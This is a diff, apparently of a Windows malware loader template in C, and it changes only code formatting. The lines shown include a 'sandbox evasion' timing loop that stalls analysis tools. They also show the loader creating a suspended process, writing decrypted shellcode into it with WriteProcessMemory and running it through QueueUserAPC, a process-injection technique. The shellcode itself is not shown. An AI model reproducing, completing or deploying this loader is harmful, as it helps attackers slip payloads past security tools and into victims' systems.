@@ -91,9 +91,9 @@ int main( int argc, char * argv[] ) {
     printf( "[*] Beginning sandbox evasion routine ...\n" );
 
     const unsigned long long count_to = 10000000000;
-    const int bw                      = 50;
-    clock_t start, end;
-    double cpu_time_used;
+    const int                bw       = 50;
+    clock_t                  start, end;
+    double                   cpu_time_used;
 
     start = clock();
 
@@ -103,7 +103,7 @@ int main( int argc, char * argv[] ) {
             cpu_time_used = ( (double)( end - start ) ) / CLOCKS_PER_SEC;
 
             double progress = (double)i / count_to;
-            int pos         = bw * progress;
+            int    pos      = bw * progress;
 
             printf( "[" );
             for ( int j = 0; j < bw; ++j ) {
@@ -210,13 +210,13 @@ int main( int argc, char * argv[] ) {
 
     printf( "[!!!] Beginning loader routine now. \n\n" );
 
-    STARTUPINFO si         = { sizeof( si ) };
-    PROCESS_INFORMATION pi = { 0 };
-    LPCSTR target          = "${ PNAME }";
+    STARTUPINFO         si     = { sizeof( si ) };
+    PROCESS_INFORMATION pi     = { 0 };
+    LPCSTR              target = "${ PNAME }";
 
     printf( "[-] Tasked to spawn: %s\n", target );
 
-    if ( !w.CreateProcessA( target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) ) {
+    if ( ! w.CreateProcessA( target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) ) {
         printf( "[-] Task 1: failed with error code %d. Unable to create the process.\n", GetLastError() );
         return 1;
     }
@@ -240,7 +240,7 @@ int main( int argc, char * argv[] ) {
     printf( "[+] Shellcode decryption complete.\n" );
 
     printf( "[-] Tasked to write shellcode to allocated memory in the target process...\n" );
-    if ( !w.WriteProcessMemory( pi.hProcess, lpBaseAddress, shellcode, shellcode_size, NULL ) ) {
+    if ( ! w.WriteProcessMemory( pi.hProcess, lpBaseAddress, shellcode, shellcode_size, NULL ) ) {
         printf( "[-] Task 3: failed with error code %d. Unable to write to the allocated memory.\n", GetLastError() );
         w.VirtualFreeEx( pi.hProcess, lpBaseAddress, 0, MEM_RELEASE );
         w.CloseHandle( pi.hProcess );
@@ -250,7 +250,7 @@ int main( int argc, char * argv[] ) {
     printf( "[+] OK: Wrote %zu bytes to %p.\n", shellcode_size, lpBaseAddress );
 
     printf( "[+] Queuing APC to the target thread...\n" );
-    if ( !w.QueueUserAPC( (PAPCFUNC)lpBaseAddress, pi.hThread, NULL ) ) {
+    if ( ! w.QueueUserAPC( (PAPCFUNC)lpBaseAddress, pi.hThread, NULL ) ) {
         printf( "[-] Task 4: failed with error code %d. Unable to queue the APC.\n", GetLastError() );
         w.VirtualFreeEx( pi.hProcess, lpBaseAddress, 0, MEM_RELEASE );
         w.CloseHandle( pi.hProcess );
